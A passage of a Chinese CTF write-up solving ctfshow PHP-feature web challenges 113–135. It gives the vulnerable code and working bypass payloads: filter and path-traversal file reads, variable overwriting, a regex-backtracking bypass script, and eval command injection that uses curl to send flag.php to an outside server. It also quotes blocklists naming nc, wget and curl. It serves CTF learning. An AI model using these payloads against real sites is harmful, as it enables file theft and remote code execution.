if(preg_match('/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){\n        die('hacker!');\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n}\n```\n\n好吧包装器filter也被过滤啦，可是我们上道题学过一个不用包装器的读取flag的方法，直接用就行了\n\n但是我们这里要学一个新姿势，利用require_once绕过不能重复包含文件的限制\n\n### 知识点:require_once 绕过不能重复包含文件的限制(目录溢出)\n\nhttps://www.anquanke.com/post/id/213235?from=timeline\n\n在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容。多次重复后绕过is_file。大佬的解释是:超过20次软连接后就可以绕过is_file\n\n这里使用的是PHP最新版的小Trick，require_once包含的软链接层数较多时once 的 hash 匹配会直接失效造成重复包含（目录溢出）\n**payload2**：目录溢出导致is_file认为这不是一个文件。\n\n```php\nfile=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n```\n\n## web114\n\n```php\n<?php\nfunction filter($file){\n    if(preg_match('/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){\n        die('hacker!');\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\necho \"师傅们居然tql都是非预期 哼！\";\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n}\n```\n\n好啊好啊，这次把上一题的两个方法全部禁用了\n\n但是细看可以发现我们的filter被放出来了，那就直接用上上题的方法做就行了，但是不能用过滤器convert，没关系我们可以不用过滤器直接用filter读取文件\n\npayload:\n\n```php\n?file=php://filter/resource=flag.php\n```\n\n## web115\n\n```php\nfunction filter($num){\n    $num=str_replace(\"0x\",\"1\",$num);\n    $num=str_replace(\"0\",\"1\",$num);\n    $num=str_replace(\".\",\"1\",$num);\n    $num=str_replace(\"e\",\"1\",$num);\n    $num=str_replace(\"+\",\"1\",$num);\n    return $num;\n}\n$num=$_GET['num'];\nif(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){\n    if($num=='36'){\n        echo $flag;\n    }else{\n        echo \"hacker!!\";\n    }\n}else{\n    echo \"hacker!!!\";\n} hacker!!!\n```\n\n出现新函数了，先了解一下新函数\n\n### str_replace()函数\n\n`str_replace()` 是 PHP 中的一个字符串替换函数，用于在一个字符串中将指定的子字符串替换为另一个子字符串\n\n基本语法:\n\n```php\nstr_replace($search, $replace, $subject)\n\n```\n\n参数说明：\n\n- `$search`：要查找和替换的子字符串，可以是一个字符串或字符串数组。\n- `$replace`：用于替换的字符串或字符串数组，可以与 `$search` 长度相同，也可以是一个字符串。\n- `$subject`：要进行替换操作的字符串或字符串数组。\n\n### trim()函数\n\n`trim()` 函数是 PHP 中用于去除字符串首尾空白字符的函数\n\n基础语法\n\n```php\ntrim($str, $charlist)\n```\n\n参数说明：\n\n- `$str`：要处理的字符串。\n\n- `$charlist`（可选）：指定要删除的字符列表。如果未指定该参数，trim() 将去除这些字符：\n\n  \" \" (ASCII 32 (0x20))，普通空格符。\n  \"\\t\" (ASCII 9 (0x09))，制表符。\n  \"\\n\" (ASCII 10 (0x0A))，换行符。\n  \"\\r\" (ASCII 13 (0x0D))，回车符。\n  \"\\0\" (ASCII 0 (0x00))，空字节符。（空字符）  %0c也相当于空字符\n  \"\\x0B\" (ASCII 11 (0x0B))，垂直制表符\n\n`trim()` 函数执行以下操作：\n\n- 删除 `$str` 字符串开头和结尾的空白字符或指定的字符列表。\n- 返回处理后的字符串。\n\n返回来分析代码\n\n第一层if语句让num进行一系列过滤后不能为36，第二层if语句又让num必须为36才能拿到flag，第一层过滤了八进制，十六进制和科学计数法，小数点和+号，可以说我能想到的能绕过验证的方法都被pass掉了，应该又是学习新姿势的题目了\n\n直接看wp进行学习:\n\n分析:\n\nis_numeric($num)要求num识别为数字或者数字字符串，但num不能强等于“36“\n\ntrim($num)!=='36'要求不能强等于”36“,然后filter之后要弱等于36\n\n$num=='36'但最后要求弱等于\"36\"\n\n所以这道题的入口应该是在于如何绕过is_numeric()和trim()函数\n\n我们可以知道，is_numeric()函数只允许数字或者数字字符串，但数字和数字字符串之间有空格也是可以的\n\n做个测试:\n\n```php\n<?php\nfor ($i=0; $i <128 ; $i++) {\n\t$x=chr($i).'36';\n\tif(is_numeric($x)===true){\n\t\techo urlencode(chr($i)).\"\\n\";\n\t}\n}\n \n//输出%09 %0A %0B %0C %0D + %2B - . 0 1 2 3 4 5 6 7 8 9\n```\n\n通过遍历ascii码找到在数字前加上字符后能通过is_numeric()函数验证的字符\n\n那我们再测试一下is_numeric()和trim()函数(或者参考trim去除的字符后看看剩下哪些字符是可以同时满足两个函数验证的)\n\n```php\n<?php\nfor($i=0;$i<=128;$i++) {\n\t$x=chr($i).'36';\n\tif(trim($x)!=='36' &&is_numeric($x)){\n\t\techo urlencode(chr($i)).\"\\n\";\n\t}\n}\n \n//输出结果%0C %2B - . 0 1 2 3 4 5 6 7 8 9\n```\n\n%0c是换页符\\f\n\n所以构造payload:\n\n?num=%0c36\n\n### 注:对于绕过，如果不知道怎么绕过就拿ASCII码把所有字符跑一遍\n\n# 突破函数禁用\n\n## web123\n\n```php\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?/\", $c)&&$c<=18){\n         eval(\"$c\".\";\");  \n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n}\n?>\n```\n\n#### 关于$_SERVER['argv']\n\n`$_SERVER` 是 PHP 中的一个超全局变量，用于获取服务器和执行环境的相关信息\n\n假设你有一个名为 `script.php` 的 PHP 脚本，并且你在命令行中执行以下命令：\n\n```php\nphp script.php arg1 arg2 arg3\n```\n\n那么在 `script.php` 中，你可以使用 `$a = $_SERVER['argv'];` 来获取命令行参数的值：\n\n```php\n$a = $_SERVER['argv'];\nprint_r($a);\n```\n\n上述代码将输出：\n\n```php\nArray\n(\n    [0] => script.php\n    [1] => arg1\n    [2] => arg2\n    [3] => arg3\n)\n```\n\n不过这个结果是在命令行下的结果，正常的网页模式下需要确保php.ini开启register_argc_argv配置项，设置register_argc_argv = On(默认是Off)才会有效果\n\n解题:\n\n思考\n\n- 我们需要传入的参数有CTF_SHOW,CTF_SHOW.COM,不能传入fl0g，但题目要求fl0g的值强等于flag_give_me才能拿到flag\n- 对$c参数进行了过滤，并限制了c的值不能大于18\n- 题目中有危险函数eval，将c传入的值当成php代码执行\n\n### 解法一:通过eval输出flag\n\n先说payload再解释:\n\n1.POST:CTF_SHOW=1&CTF[SHOW.COM=1&fun=extract($_POST)&fl0g=flag_give_me\n\n2.POST:CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag\n\n3.POST:CTF_SHOW=&CTF[SHOW.COM=&fun=var_dump($GLOBALS)   //题目出不来，本地测试可以\n\n前面对于CTF_SHOW的传参就不说了，只是单纯为了满足条件，和第二个参数CTF_SHOW.COM一样，但这里可以发现为什么我们传入的参数不是CTF_SHOW.COM而是CTF[SHOW.COM，这就涉及到PHP的命名规则了\n\n#### PHP命名规则\n\n变量名的命名规则是\n\n- 变量以 $ 符号开头，其后是变量的名称。\n- 变量名称必须以字母或下划线开头。\n- 变量名称不能以数字开头。\n- 变量名称只能包含字母数字字符和下划线（A-z、0-9 以及 _）。\n\n我们需要明白一下PHP的字符串解析\n\n#### PHP的字符串解析特性bypass\n\nPHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST时，查询字符串在解析的过程中会将某些字符删除或用下划线代替\n\n**在 PHP 8 之前 的版本中，当参数名中含有 .（点号）或者`[`(下划线)时，会被自动转为 `_`（下划线）。如果`[`出现在参数中使得错误转换导致接下来如果该参数名中还有非法字符并不会继续转换成下划线`_`，但是如果参数最后出现了`]`,那么其中的非法字符还是会被正常解析(不会转换)，因为被当成了数组**\n\n### 解法二:通过eval赋值给fl0g拿到flag\n\npayload1:\n\n```php\nGET:?$fl0g=flag_give_me\nPOST:CTF_SHOW=&CTF[SHOW.COM=&fun=assert($a[0])\n```\n\n`$_SERVER['QUERY_STRING']` 是 PHP 中一个包含当前请求 URL 查询字符串的超全局变量。查询字符串是 URL 中问号（`?`）后面的部分，通常用于传递参数给服务器。当我们通过get传入fl0g的时候，$a[0]= $_SERVER['QUERY_STRING']=($fl0g=flag_give_me);assert 函数用于执行字符串中的 PHP 代码，实现变量覆盖。\n\npayload2：\n\n```php\nget: a=1+fl0g=flag_give_me\npost: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])\n```\n\n知识点:\n\n利用parse_str()将字符串解析成多个变量+隔断argv\n\n本地测试:\n\n```php\n<?php\nvar_dump($_SERVER['argv']);\n```\n\n<img src=\"./../image/achieve/202411/php特性---ctfshow/73a60425890c8f915c96a6b17911a449.png\" alt=\"img\" style=\"zoom: 80%;\" />\n\n可以用加号+进行分隔，从而使得$_SERVER['argv']这个array不仅仅只有[0]。\n\n大佬的总结说：\n\nCLI模式下直接把 request info ⾥⾯的argv值复制到arr数组中去\n\n继续判断query string是否为空，\n\n如果不为空把通过+符号分割的字符串转换成php内部的zend_string，\n\n然后再把这个zend_string复制到 arr 数组中去。\n\n这样就可以通过加号+分割argv成多个部分，正如我们上面测试的结果\n\n简单来说就是通过+分割argv的结果，使得我们可以利用数组的调用去进行传参绕过验证\n\n## web125\n\n```php\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i\", $c)&&$c<=16){\n         eval(\"$c\".\";\");\n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n}\n?>\n```\n\n真狠啊把一堆关键词都过滤了\n\n找找看哪个输出函数是可以用的上的\n\npayload:\n\n`POST:CTF_SHOW=1&CTF[SHOW.COM=1&fun=extract($_POST)&fl0g=flag_give_me`\n\n### extract($array)用法\n\n`extract($_POST)` 是将 `$_POST` 超全局变量中的键值对解压缩为对应的变量和值。\n\n`extract($array)`： 从数组中将变量导入到当前的符号表。可以实现变量覆盖。\n\n或者可以用highlight_file\n\n`GET:?1=flag.php `\n`POST:CTF_SHOW=&CTF[SHOW.COM=&fun=highlight_file($_GET[1])`\n\n或者可以用上一题第二种解法\n\n## web126\n\n```php\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i\", $c) && strlen($c)<=16){\n         eval(\"$c\".\";\");  \n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n}\n```\n\n解法和前面的是一样的，没什么大变化\n\n## web127\n\n### #绕过$_SERVER['QUERY_STRING']\n\n```php\n$ctf_show = md5($flag);\n$url = $_SERVER['QUERY_STRING'];\n//特殊字符检测\nfunction waf($url){\n    if(preg_match('/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\'|\\\"|\\<|\\,|\\>|\\.|\\\\\\|\\//', $url)){\n        return true;\n    }else{\n        return false;\n    }\n}\nif(waf($url)){\n    die(\"嗯哼？\");\n}else{\n    extract($_GET);\n}\nif($ctf_show==='ilove36d'){\n    echo $flag;\n}\n```\n\n这里就是得绕过$url = $_SERVER['QUERY_STRING'];\n\npayload1:\n\n因为$_SERVER['QUERY_STRING']是用于获取查询语句(即?号之后的参数)的\n\n`$_SERVER['QUERY_STRING'];`获取的查询语句是服务端还没url解码的，所以url编码绕过即可`\n\n```html\n?ctf%5fshow=ilove36d\n```\n\npayload2\n\n题目检查的是query_string而不是$_GET\n因此可以利用不合法的变量名，让其自动替换成`_\n\n```\nGET:?ctf%20show=ilove36d\n```\n\n我们来看看哪些不合法的字符会被解析成下划线\n\n### 不合法变量名字符的解析\n\n在php中，解析字符串变量名的时候，会将一些非法字符转化成下划线，因此我们可以借助这个绕过url获取查询语句的验证\n\n能够被解析成_的ascii为，+(空格) . %5B([) _\n\n## web128\n\n### #无数字无字母函数\n\n```php\n$f1 = $_GET['f1'];\n$f2 = $_GET['f2'];\n\nif(check($f1)){\n    var_dump(call_user_func(call_user_func($f1,$f2)));\n}else{\n    echo \"嗯哼？\";\n}\nfunction check($str){\n    return !preg_match('/[0-9]|[a-z]/i', $str);\n} NULL\n```\n\n### 相关函数\n\n#### call_user_func()函数\n\n在 PHP 中，`call_user_func()` 函数用于调用一个回调函数。这个函数非常灵活，可以用来调用普通的用户定义函数、静态方法、对象方法等\n\n基础语法\n\n```php\nmixed call_user_func(callable $callback, mixed ...$parameters)\n```\n\n参数说明\n\n- **$callback**: 要调用的函数名或方法（可以是字符串或数组）。\n- **$parameters**: 可变参数，可以传入给回调函数的参数。\n\n返回值\n\n```\ncall_user_func()` 将返回被调用函数的返回值。如果要调用的函数没有返回值，则返回 `NULL\n```\n\n回到题目\n\n这里对f1进行了字母数字的过滤\n\n对于call_user_func()函数的嵌套，我们可以看到，如果f1是一个可执行的函数，那么这个call_user_func()函数会执行f1函数并传入f2作为参数，但因为外层还有一个call_user_func()函数，所以内部的返回值必须是另一个可调用的函数\n\n搜查资料可以找到一个函数_()，即 gettext()的拓展函数，但是要求php扩展目录下有php_gettext.dll这个文件\n\n```php\n$domain = 'test';\nbindtextdomain($domain, \"locale/\");//设置某个域的mo文件路径\ntextdomain($domain);//设置gettext()函数从哪个域去找mo文件\necho _(\"Hi,phper!\");//_()是gettext()函数的简写形式\n```\n\n`_()` 函数在 PHP 中通常用于国际化和本地化的字符串翻译\n\n所以f1设为_就可以绕过验证也能将内置函数的返回值输出出来，所以f2设置为另一个可以读取flag的函数就可以了\n\n这里我们将f2设置为get_defined_vars()函数\n\n### get_defined_vars()函数\n\n`get_defined_vars()` 是 PHP 的一个内置函数，它用于返回当前作用域中所有已定义变量的关联数组,这个函数非常有用，特别是在调试过程中，因为它可以让开发者查看当前作用域内的所有变量及其值。\n\n基础用法\n\n```php\narray get_defined_vars(void)\n```\n\n返回值\n\n`get_defined_vars()` 返回一个关联数组，数组的键是变量名，值是对应的变量值。\n\n所以最终的payload是\n\n```\nPayload：?f1=_&f2=get_defined_vars\n```\n\n## web129\n\n```php\nif(isset($_GET['f'])){\n    $f = $_GET['f'];\n    if(stripos($f, 'ctfshow')>0){\n        echo readfile($f);\n    }\n}\n```\n\n### stripos()函数\n\n`stripos()` 是 PHP 的一个内置函数，用于在一个字符串中查找另一个字符串的首次出现位置，比较时不区分大小写\n\n基础语法\n\n```php\nint stripos(string $haystack, string $needle, int $offset = 0)\n```\n\n参数\n\n**$haystack**: 要搜索的目标字符串。\n\n**$needle**: 要查找的子字符串。\n\n**$offset**: 可选参数，指定从哪个位置开始搜索。默认值是 0。\n\n返回值\n\n- 如果找到 `$needle`，则返回 `$needle` 在 `$haystack` 中首次出现的位置（以 0 为起始索引）。\n- 如果未找到，返回 `FALSE`。\n\n### readfile()函数\n\n`readfile()` 是 PHP 的一个内置函数，用于读取文件并将其内容发送到输出缓冲区\n\n基础语法\n\n```php\nint readfile(string $filename, bool $use_include_path = false, resource $context = null)\n```\n\n参数\n\n- **$filename**: 要读取的文件的路径（可以是相对路径或绝对路径）。\n- **$use_include_path**: 可选参数，表示是否在包括路径中查找文件。默认为 `false`。\n- **$context**: 可选参数，指定一个上下文资源，用于修改文件的读取行为（例如，设置流选项）。\n\n返回值\n\n- 返回读取的字节数，或者在出错时返回 `false`。\n\n解题\n\nstripos($f, 'ctfshow')>0--用于检查字符串 `$f` 中是否包含子字符串 `'ctfshow'`，并且这个子字符串第一次出现的位置是否大于 0\n\n因为readfile()函数是输出一个文件，所以我们的f中应该包含一个文件目录\n\n但是因为我们不知道flag在哪层目录里面，所以我们试一下目录穿越\n\n### 目录穿越\n\n**定义与原理**\n\n- 定义：目录穿越是指攻击者通过构造特定的URL或请求，绕过Web应用程序的安全机制，访问或执行服务器上的任意文件或命令。\n- 原理：在文件系统路径中，.. 表示上一级目录。攻击者可以利用这一点，通过构造包含多个 ../ 的URL或请求，逐步向上移动目录树，直到能够访问到服务器上的敏感文件或执行受限命令。\n\n**常见攻击手法**\n\n- URL参数：攻击者可以在URL中插入 ../ 序列，尝试访问上级目录中的文件。\n- 文件绝对路径：在某些情况下，攻击者可能会尝试使用文件的绝对路径来直接访问目标文件。\n- 绕过手段：为了绕过Web应用程序的安全检查，攻击者可能会使用URL编码、单次替换（双写）、截断绕过等技巧来构造恶意请求。\n\n所以我们构造payload\n\n```\n?f=/ctfshow/../../../../var/www/html/flag.php\n```\n\n其中的../../../这是深层目录，根据需要尝试，另外目录是根据之前的题目猜测得到，var/www/html/index.php也有回显\n\n或者也可以直接用包装器进行读取flag\n\nPayload：?f=php://filter/ctfshow/resource=flag.php，只要包含了ctfshow且出现位置不为0都可以通过验证\n\n我一开始很疑惑，这里面的ctfshow不会影响这个payload的实现吗，然后我搜寻了一下得到了较为合理的解释\n\n在 PHP 中，`php://filter` 是一个特殊的流包装器，它用于对数据进行过滤或处理。你提到的 payload `?f=php://filter/ctfshow/resource=flag.php` 使用了 `php://filter` 来访问名为 `flag.php` 的文件，并且遭遇到的 `stripos($f, 'ctfshow') > 0` 检查实际上不会影响对 `flag.php` 读取的执行。\n\n### 要点:PHP对无法使用的filter过滤器只会抛出warning而不是error\n\nctfshow过滤器解析\n\n1. **流包装器的工作原理**：\n\n   - `php://filter` 允许你对资源进行过滤。在这个情况下，`php://filter/ctfshow/resource=flag.php` 被理解为请求流过滤器 `ctfshow` 来处理文件 `flag.php` 的内容。\n   - `ctfshow` 在此处并不是直接影响文件读取的内容，而是作为过滤器存在。\n\n2. **`stripos` 检查**：\n\n   - 当 `stripos($f, 'ctfshow')` 被调用时，它会返回 `15`（`ctfshow` 在字符串中的起始索引），因为这个字符串是 `php://filter/ctfshow/resource=flag.php`。这意味着这个条件会为 `true`，后续代码将继续执行。\n   - 这里的 `ctfshow` 实际上不会干扰读取 `flag.php`，反而它是被作为处理该文件的一部分。\n\n3. **文件读取的过程**：\n\n   - 当 PHP 处理这个请求时，它首先识别到 `php://filter`，然后应用 `ctfshow` 过滤器。接着，PHP 会读取 `flag.php` 文件的内容。\n   - `ctfshow` 作为过滤器的作用是对输出进行操作，而不是改变读取的文件内容或路径。\n\n   说白了就是**PHP对无法使用的filter过滤器只会抛出warning而不是error，还是能正常执行的**\n\n## web130\n\n```\nvery very very（省略25万个very）ctfshow\n```\n\n```php\nif(isset($_POST['f'])){\n    $f = $_POST['f'];\n    if(preg_match('/.+?ctfshow/is', $f)){\n        die('bye!');\n    }\n    if(stripos($f, 'ctfshow') === FALSE){\n        die('bye!!');\n    }\n    echo $flag;\n}\n```\n\n### .+?非贪婪模式(.*？)\n\n- **非贪婪模式**：通过在量词后添加 `?`，使得匹配尽可能少的字符，直到找到第一个满足整个表达式的匹配。\n\n- ### 常用的量词与非贪婪模式\n\n  为了使用非贪婪模式，可以在以下量词后添加 `?`：\n\n  - `*?`：匹配零个或多个字符（非贪婪）。\n  - `+?`：匹配一个或多个字符（非贪婪）。\n  - `??`：匹配零个或一个字符（非贪婪）。\n  - `{n,m}?`：匹配至少 n 个字符，至多 m 个字符（非贪婪）。\n\n- .+?”表示非贪婪匹配，即前面的字符至少出现一次\n\n#### /s正则匹配\n\n- 这个修饰符表示点号 `.` 可以匹配换行符。这意味着在多行文本中，`.` 也可以匹配换行符后的字符。\n\n所以这个正则匹配的意思是，如果ctfshow前面有任意字符，则匹配成功\n\n那我们直接传入ctfshow就可以了，只要前面没有字符的话就能同时满足两个if判断\n\n还有别的方法，我们放在下道题进行深入讲解\n\n## web131\n\n```php\nif(isset($_POST['f'])){\n    $f = (String)$_POST['f'];\n    if(preg_match('/.+?ctfshow/is', $f)){\n        die('bye!');\n    }\n    if(stripos($f,'36Dctfshow') === FALSE){\n        die('bye!!');\n    }\n    echo $flag;\n}\n```\n\n这里的话一个是得满足ctfshow前面不能有字符，另一个是需要ctfshow前面有36D字符串，这种情况下只能用新的方法了\n\n### 正则最大回溯\n\n在正则匹配中往往有一定的限制，我们可以利用正则最大回溯来超过限制使得正则返回false\n\n在php的扩展中提供了两个设置项\n\n```php\n1. pcre.backtrack_limit //最大回溯数\n2. pcre.recursion_limit //最大嵌套数\n```\n\nPHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit，默认的backtarck_limit是1000000(100万).\n\n我们可以通过var_dump(ini_get('pcre.backtrack_limit'));的方式查看当前环境下的上限：结果返回为1000000\n\n#### 非贪婪模式的详解\n\n在非贪婪模式下， 在可配可不配的情况下，优先不匹配，先将匹配控制交给正则表达式的下一个匹配字符。当之后的匹配失败的时候再回溯，进行匹配\n\n举个例子\n\n```\n匹配的字符串: aaab\n正则匹配的字符: .*?b\n```\n\n匹配过程开始的时候, \".*?\"首先取得匹配控制权, 因为是非贪婪模式, 所以优先不匹配, 将匹配控制交给下一个匹配字符\"b\", \"b\"在源字符串位置1匹配失败(\"a\"), 于是回溯, 将匹配控制交回给\".*?\", 这个时候, \".*?\"匹配一个字符\"a\", 并再次将控制权交给\"b\", 如此反复, 最终得到匹配结果, 这个过程中一共发生了3次回溯.\n\n利用这个原理，我们可以想到默认的backtarck_limit是十万，所以只要我们让我们的回溯次数超过十万，就会导致匹配失败而退出\n\n### 回溯上限绕过脚本\n\n```php\nimport requests\n \nurl='http://7827dca0-b812-4948-bac9-0cd382fd656e.challenge.ctf.show/'#目标url\ndata={\n    'f':'very'*250000+'36Dctfshow'\n}\nr=requests.post(url=url,data=data).text\nprint(r)\n```\n\n因为very是四个字符，每个字符都要回溯一次，所以为了达到100万次的上限制，只需要25万个very就行，达到100万次回溯后，后面的36D再进行3次回溯，此时已经超过了限制，就会使正则返回false达到绕过\n\n## web132\n\n怎么打开是一个网站\n\n![image-20241115145427795](./../image/achieve/202411/php特性---ctfshow/image-20241115145427795.png)\n\n在源码中没发现什么信息，用dirsearch扫一下目录\n\n![image-20241115150015507](./../image/achieve/202411/php特性---ctfshow/image-20241115150015507.png)\n\n发现了一个/robots.txt，应该是robots协议\n\n还有一个admin，访问看看\n\n```php\nif(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){\n    $username = (String)$_GET['username'];\n    $password = (String)$_GET['password'];\n    $code = (String)$_GET['code'];\n\n    if($code === mt_rand(1,0x36D) && $password === $flag || $username ===\"admin\"){\n        \n        if($code == 'admin'){\n            echo $flag;\n        }\n        \n    }\n}\n```\n\n### mt_rand()函数\n\n`mt_rand()` 是 PHP 中的一个随机数生成函数，用于生成伪随机整数。\n\n函数语法:\n\n```php\nint mt_rand(int $min = 0, int $max = MT_RAND_MAX);\n```\n\n参数说明\n\n- **`$min`**: （可选）生成的随机数的最小值，默认为 `0`。\n- **`$max`**: （可选）生成的随机数的最大值，默认为 `MT_RAND_MAX`，通常是 `2147483647`（即 PHP 中 `mt_rand` 的最大返回值）。\n\n返回值\n\n- 返回一个介于 `$min` 和 `$max` 之间的伪随机整数（包括 `$min` 和 `$max`）。\n\n所以这里会生成1-877之间的随机数\n\n这里的三个条件通过逻辑运算符连接，不过我们应该先了解一下逻辑运算符的优先级\n\n### 逻辑运算符优先级\n\n1. **`!`**（逻辑非，取反）:\n   - 这是唯一的单目运算符，优先级最高。\n   - `!a` 表示如果 `a` 为 `false`，则结果为 `true`，反之亦然。\n2. **`&&`**（逻辑与）:\n   - 优先级高于 `||`。\n   - 表达式 `a && b` 只有在 `a` 和 `b` 都为 `true` 时结果为 `true`。\n3. **`||`**（逻辑或）:\n   - 优先级低于 `&&`。\n   - 表达式 `a || b` 只需 `a` 或 `b` 至少有一个为 `true`，结果即为 `true`。\n\n这里可以看到，&&的优先级高于||，所以里面的语句可以分成\n\n if( [$code === mt_rand(1,0x36D) && $password === $flag] || $username ===\"admin\")\n\n这样来看，如果前面两个条件有一个不满足，都会返回false，但在||语句中，只要有一个条件满足即可，所以只要让后面的username满足条件就可以通过if判断语句,第一个if语句满足了，第二个语句就相对容易的多了\n\npayload:\n\n```\nPayload：?code=admin&password=1&username=admin\n```\n\n## web133\n\n```php\nif($F = @$_GET['F']){\n    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){\n        eval(substr($F,0,6));\n    }else{\n        die(\"6个字母都还不够呀?!\");\n    }\n}\n```\n\n**`@` 符号**:\n\n- 这是 PHP 的错误抑制运算符。使用 `@` 运算符可以抑制表达式中可能出现的任何错误或警告。\n\n这道题限制了参数的字符串长度，还对参数进行了一些函数的过滤\n\n这里可以注意到eval函数里面有一个substr函数，说明会截取这个$F参数的前六位作为php代码去执行，但是因为这里限制了很多函数，且还有长度限制，这时候我们有一个新思路，就是通过传递参数本身实现变量覆盖\n\n### 传递参数本身实现变量覆盖\n\n解题:\n\n```none\n先尝试：\n/?F=`$F `;sleep 3\t//注意$F后有空格，这样到分号刚好6个字符\n这样传入的话可以得到eval(`$F `;)，而$F=`$F `;sleep 3\n``反引号是shell_exec()函数的缩写，以命令行形式执行命令\n这样会执行命令`$F `;也即shell_exec($F)==>shell_exec(`$F `;sleep 3)\n我们就可以成功执行sleep 3了，因为是在shell里执行了，所以前面的表达式不管了，我们通过分号后的表达式来执行想要的命令\n所以这是无回显的RCE题目\n无回显我们可以用反弹shell 或者curl外带 或者盲注\n这里的话反弹没有成功，但是可以外带。\n```\n\n所以这里就是实现了变量覆盖进行命令执行\n\n然后我们讲一下用curl外带的方法\n\n### curl 外带\n\n\"curl\" 命令是一个在命令行下使用的工具，用于传输数据\n\ncurl的相关命令\n\n```none\n-F参数用来向服务器传输二进制文件，-X参数用来指定http代理\n```\n\n我们需要通过curl让目标服务器向我们的服务器发送我们想要的东西，这里的服务器我们可以用burp的服务器Collaborator服务器\n\npayload:\n\n```\n?F=`$F`;+curl -X POST -F xx=@flag.php  服务器地址\n```\n\n对 payload 的一些解释：\n\n-F 为带文件的形式发送 post 请求；\n\n其中 xx 是上传文件的 name 值，我们可以自定义的，而 flag.php 就是上传的文件 ；\n\n**相当于让服务器向 Collaborator 客户端发送 post 请求，内容是flag.php。**\n\n![image-20241118105607463](./../image/achieve/202411/php特性---ctfshow/image-20241118105607463-1731898571388-1.png)\n\n也可以进行命令执行\n\n```\n?F=`$F`; curl 服务器地址/`ls`\n```\n\n命令的输出将被插入到 curl 命令的 URL 中 \n\n![image-20241118105850560](./../image/achieve/202411/php特性---ctfshow/image-20241118105850560.png)\n\n```\n?F=`$F`; curl 服务器地址/`cat flag.php|grep ctfshow`\n```\n\n因为 flag.php 内容是多行，所以结合 grep 找一下。整体来说，这个命令企图读取服务器上 `flag.php` 文件中包含 `ctfshow` 的行，然后将该行的内容作为 URL 的一部分发送到指定的外部服务器。\n\n![image-20241118110005583](./../image/achieve/202411/php特性---ctfshow/image-20241118110005583.png)\n\n## web134\n\n```php\n$key1 = 0;\n$key2 = 0;\nif(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {\n    die(\"nonononono\");\n}\n@parse_str($_SERVER['QUERY_STRING']);\nextract($_POST);\nif($key1 == '36d' && $key2 == '36d') {\n    die(file_get_contents('flag.php'));\n}\n```\n\n如果通过 GET 或 POST 请求中设置了 key1 或 key2，脚本将停止执行并输出 \"nonononono\"。\n\n@parse_str($_SERVER['QUERY_STRING']);---解析查询字符串并将变量提取到当前作用域中\n\n`extract($_POST)` 是将 `$_POST` 超全局变量中的键值对解压缩为对应的变量和值。\n\npayload:\n\n```\n?_POST[key1]=36d&_POST[key2]=36d\n```\n\n由于 extract($_POST)，这两个 POST 参数会被提取为局部变量 $key1 和 $key2；解析后，会将 $_POST['key1'] 和 $_POST['key2'] 赋值为 36d；这样就能使 $key1 和 $key2 都等于 36d，从而通过最后的条件检查。\n\n传参后在源码中可以找到flag\n\n![image-20241118112218415](./../image/achieve/202411/php特性---ctfshow/image-20241118112218415.png)\n\n## web135(绕过命令函数)\n\n### #重定向，重命名，文件复制，ping函数\n\n```php\nif($F = @$_GET['F']){\n    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){\n        eval(substr($F,0,6));\n    }else{\n        die(\"师傅们居然破解了前面的，那就来一个加强版吧\");\n    }\n}\n```\n\n这里过滤了很多函数，当然curl外带也不行了\n\n学习新姿势\n\n我们可以看到这道题的目录是可写的，所以我们试一下新命令\n\n```\n## 重定向\n?F=`$F `;nl flag.php>flag\n- 